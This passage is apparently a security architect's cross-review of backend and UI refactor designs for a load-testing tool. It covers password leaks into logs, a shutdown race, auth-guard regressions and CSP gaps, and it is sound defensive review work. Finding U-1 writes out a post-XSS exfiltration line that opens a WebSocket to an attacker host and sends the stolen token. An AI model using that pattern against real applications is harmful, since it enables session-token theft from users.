- **One sequencing note (not a conflict)**: T-01's OTP rotation is a **two-party operation** (tool + gateway). The plan's T-01 ordering (rotate inside the tool) is fine, but the owner must confirm the gateway's `OTP_SECRET` value in the same change-window, or the register path breaks silently (E1). Flag to the council + gateway owner.
- **Open question for the council**: whether `docs/loadtest-reports/*` should be gitignored (keeping one G-7 sample) or committed. Not a security boundary (no tokens in reports), just repo hygiene.

---

## Cross-refutation by Security Architect (2026-08-04)

Adversarial review of `DESIGN-prod-refactor-backend.md` (Backend) and `DESIGN-prod-refactor-ui.md` (UI). Code evidence verified against the working tree. Verdicts: **CONFIRMED** = shown in code/design; **PLAUSIBLE** = design leaves the door open; **REFUTED** = claim does not hold or is not a real risk.

### Findings vs Backend Architect

| # | Severity | Claim | Verdict | Code evidence | Concrete fix |
|---|---|---|---|---|---|
| B-1 | **Major** | `QueryResult<T>.error` carries `{ code, message, sql, params }` and the design intends to "log có SQL" for diagnostics (`backend §4.2`). `insertPoolAccounts` (`store.ts:473-476`) and `createAdmin` (`store.ts:206-211`) put **plaintext pool passwords** and **scrypt hashes** in `params`. If `DbWriter` (`§4.3` "ltLog.warn kèm {runId}") or any caller logs the error object, plaintext passwords + admin hashes land in logs and the **new JSONL file sink** (`logger.ts` `createJsonlSink`) — a persistent, shippable artifact. | CONFIRMED (as designed; the leak is conditional on logging the error object, which the design explicitly enables) | `store.ts:473-476`, `store.ts:206-211`, backend §4.2/§4.3 | Redact `params` whose key matches `/password\|secret\|token\|hash/i` before placing them in the error object; or never persist `params` for write queries — log only `code` + `runId`. Add a logger rule: never log `Authorization`, `password`, `passwordHash`, `refreshToken` (same rule I set in §4.4 — make it a shared module-level guard). |
| B-2 | **Major** | Graceful shutdown flushes everything before exit (`backend §6`: `await coordinator.stop(true)` → `await dbWriter.shutdown()`). | CONFIRMED — window exists | `coordinator.ts:497` `void this.dbWriter?.writeRunFinish(...)` is **fire-and-forget** inside `finishRun`; `stop(true)` (`coordinator.ts:239`) returns `finishRun`'s promise, which resolves **before** `writeRunFinish`'s `finalizeRun` UPDATE completes. `dbWriter.shutdown()` then calls `store.disconnect()` (`writer.ts:58`) → `pool.end()`, which can drop the in-flight `finalizeRun`. Result: run row stuck `status='running'` (only recovered by crash-detect on next boot) — a half-written final state. | `coordinator.ts:239,497`; `writer.ts:51-59`; `server.ts:41-49` | Make `finishRun` `await this.dbWriter.writeRunFinish(...)` (or have `dbWriter.shutdown()` await a pending finalize before `pool.end()`). Add a shutdown test: kill mid-run → assert `runs.status != 'running'` before pool closes. |
| B-3 | **Major** | Route-table decomposition with "3 guard gọi đầu mỗi handler" preserves the auth boundary. | PLAUSIBLE — regression risk | Current single gate at `api-server.ts:145-146` covers **every** non-auth route; the design moves auth into per-handler calls (`backend §1.1`). Any new/refactored handler that forgets `requireAuth` becomes unauthenticated silently. The register-gate + rate-limit ordering also becomes per-route. | `api-server.ts:142-146` | Register guards at route-table build time (`guard(requireAuth, handler)`), not inside handler bodies. Add a contract test asserting **every** non-`/health` non-`/auth/*` route returns 401 with no token (cheap, high-value). |
| B-4 | **Minor** | `newRunId()` fix makes collision "không thực tế" (needs same ms + same pid + same counter). | CONFIRMED — claim is wrong | `ts = Date.now().toString(36).slice(-6)` keeps only the last 6 base36 digits, which wraps every 36⁶ ms ≈ **25.2 days**. Two runs on the same `pid % 46656` and same `runSeq` 25 days apart collide. `insertRun` is best-effort `void` (`store.ts:244-265`) → silent PK-violation = lost history; `accounts-{runId}.json` (`auth-factory.ts:101-103`) overwritten. | `config.ts:221-225`; backend §8.3 | Keep the pid+seq fix but use more timestamp entropy (e.g., full `Date.now().toString(36)` or append a 4-char `crypto.randomBytes` suffix). Document the collision boundary in the test, not the "impossible" claim. |
| B-5 | **Minor** | `store.ensureSchema()` → wrapper calls `runMigrations` on **every startup** (`backend §3.5`). | PLAUSIBLE — deviation from PRD model | PRD §5.5/G-8 defines migration as manual CLI (`db:up/down/status`). Auto-applying pending migrations at startup would silently run a future destructive migration (e.g., a `DROP`/data-transform) without an operator action. | `store.ts:160-169`; `writer.ts:43` | Either restrict startup auto-migrate to idempotent `IF NOT EXISTS` migrations, or fail-fast at startup (`schema_version < latest` → error "run npm run loadtest:db:up"). Make the choice explicit in T-04. |
| B-6 | Minor | Env-var drift between designs: my `LOADTEST_RATE_LIMIT_OFF` vs backend `LOADTEST_RATE_LIMIT_DISABLED`; my "count failures only" vs backend "count every 4xx" (409-duplicate counts as a fail). | CONFIRMED | security §4.2 vs backend §2.1/§2.2 | Align on one name and one "fail" definition before T-06; the 409-as-fail choice is defensible but must be documented as a decision (it also blocks register-spam, which is good). |
| B-7 | REFUTED | SQL injection risk in migration runner. | REFUTED — no user input reaches the SQL | Migration files are trusted repo files executed via `client.query(sql)` (simple protocol, no params); `cleanup` parses argv but uses parameterized queries (`schema.sql` tables, `DELETE ... WHERE`). | `backend §3.2/§3.5` | None. |
| B-8 | REFUTED | Envelope change breaks frontend `ApiError` parsing. | REFUTED — additive fields are safe | `loadtest-api.ts:36-45` reads `statusCode/message/errors/warnings`; `api.ts` `ApiError` reads `statusCode/message/error/traceId` (`api.ts:94-115`). Adding `timestamp`/`error`/`requestId` is additive. | `loadtest-api.ts:36-45`; `api.ts:94-115` | None. |
| B-9 | REFUTED | Removing socket `query.token` breaks the connection. | REFUTED — header fallback confirmed | Gateway reads `handshake.query?.token` **first**, then `handshake.headers?.authorization` (`websocket.gateway.ts:148-149`); removing query keeps the header path working. | `websocket.gateway.ts:148-149`; `socket.ts:87`; `socket-farm.ts:97` | None. |

### Findings vs UX/UI Designer

| # | Severity | Claim | Verdict | Code evidence | Concrete fix |
|---|---|---|---|---|---|
| U-1 | **Major** | CSP `connect-src 'self' ws: wss:` blocks exfiltration to attacker origins (the design's own rationale for why CSP makes the localStorage residual risk acceptable). | CONFIRMED — claim false for the ws wildcard | A post-XSS script can `new WebSocket('ws://attacker-host:port')` and ship the token in the first frame; `ws:`/`wss:` scheme-wildcards allow **any** host/port. The same hole exists in my design §5.2. | UI §2.2, security §5.2 | Bind `connect-src` to the real gateway origin(s): `ws://<gateway-host> wss://<gateway-host>` (drop the bare `ws:`/`wss:` wildcard in prod). If the gateway origin is fixed, this is a one-line string. |
| U-2 | **Major** | Prod CSP "just works" because the gateway is same-origin (nginx-proxied). | PLAUSIBLE — topology not established | The repo's sibling services each ship their own Dockerfile; nothing in this repo pins the prod gateway to the chat origin. If the gateway is deployed on a different origin (the likely topology), `connect-src 'self'` blocks **all** REST calls (`api.ts` baseURL = `env.gatewayUrl`) and the socket (`socket.ts:84`), and the app breaks. The design's own "Deploy note" concedes this. | `api.ts:37-41`; `socket.ts:84-94`; UI §2.2 item 3 | Drive the CSP from a build-time env (`VITE_CSP_CONNECT_SRC`), or set CSP as an nginx **header** with the real origins (resolving the double-CSP conflict in UI §8#1 by making nginx the canonical source with real origins). Add a prod smoke test that REST + socket pass CSP. |
| U-3 | **Minor** | CSP audit / rationale ignores the existing `dangerouslySetInnerHTML` in the chat app. | PLAUSIBLE | `MatchingScreen.tsx:131` renders `search` via `dangerouslySetInnerHTML`. Today `search` is only set from constants/`DEMO_PEOPLE` (not user input), so **not a live XSS** — but the design's "CSP is the dominant XSS control" claim should be paired with a code rule, or the pattern silently ships. | `MatchingScreen.tsx:43,53,73,131` | Add `react/no-danger` (or `react/dom-no-dangerous-setinnerhtml`) to eslint; refactor `search` to JSX (it only interpolates a constant name). |
| U-4 | Minor | `frame-ancestors` protection dropped (meta CSP can't enforce it). | CONFIRMED — accepted tradeoff | Directive is header-only; UI §8#2 correctly defers it to THREAT-MODEL. Bearer auth + local tool makes clickjacking low-risk, but my design §5.2 included it via nginx. | UI §2.2 item 7, §8#2 | Accept for MVP; record in THREAT-MODEL (already planned). Note the divergence from my design. |
| U-5 | REFUTED | `style-src 'unsafe-inline'` is a real risk. | REFUTED | Inline style attributes cannot execute scripts; CSS-based exfil via `url()`/`@font-face` is governed by `img-src`/`font-src`, both restricted (`img-src 'self' data:`, `font-src https://fonts.gstatic.com`). No user-controlled HTML feeds the style pipeline. | UI §2.2 item 2; `index.html:12-15` | None. |
| U-6 | REFUTED | Session notice / prefs validation adds new injection surface. | REFUTED | `shouldWarnSession` is pure + static text; `parseLoadtestPrefs` is strict-boolean with silent default (no output sink beyond the store). No new XSS sink. | UI §3.2, §4.2; `loadtest.store.ts:29-37` | None. |
| U-7 | REFUTED | ErrorBoundary "no stack in prod" is not achievable. | REFUTED — achievable | `import.meta.env.DEV` is a Vite build-time constant (`false` in prod builds); the `<details>` block is stripped. The try/catch static-div fallback also covers a crashing design system. | UI §1.2; `vite.config.ts` | None. |

### Self-critique — my own design's confirmed flaws surfaced by the others

1. **`connect-src 'self' ws: wss:` wildcard (my §5.2) has the same exfil hole I flag in U-1.** My claim that "connect-src ... blocks fetch/WebSocket to attacker origins" is overstated for the `ws:`/`wss:` scheme wildcard, which I justified as "deliberate relaxation". CONFIRMED — I must bind to the gateway origin (I recorded it as a follow-up; it should be in T-08, not v1.1).
2. **I did not catch the plaintext-password-in-logs path (B-1).** My §4.4 guards the **API response** (generic 500) and "do not log Authorization/password fields" — but the QueryResult error object carrying `sql + params` for `insertPoolAccounts` is a new log surface I should have caught in my own threat model. CONFIRMED — adopt the B-1 redaction rule in §4.4.
3. **My §5.3 says "harden the chat's render paths (never dangerouslySetInnerHTML user content — verify in T-08)"** but the codebase already has `dangerouslySetInnerHTML` at `MatchingScreen.tsx:131`. It is currently safe (constant input), but my audit should have named the file and mandated the lint rule. CONFIRMED (Minor).
4. **Env-var naming drift with the backend design** (`LOADTEST_RATE_LIMIT_OFF` vs `LOADTEST_RATE_LIMIT_DISABLED`) — B-6. CONFIRMED (Minor).
5. **The shutdown race (B-2) is inherited from current code** (`coordinator.ts:497`) and my design (which reviewed graceful shutdown only in §5.2 of the PRD) did not flag it. Called out by the backend design's shutdown section — CONFIRMED (Major).

**Bottom line for the council**: Backend's QueryResult error shape (B-1) and the shutdown race (B-2) need fixes before T-05/T-06; the per-handler guard risk (B-3) needs a route-table-level guard wrapper + a 401 contract test. UI's CSP must bind `connect-src` to the real gateway origin (U-1) and resolve the prod-topology assumption (U-2) before T-08. My own design shares U-1 and adds B-1/B-2 to its threat model.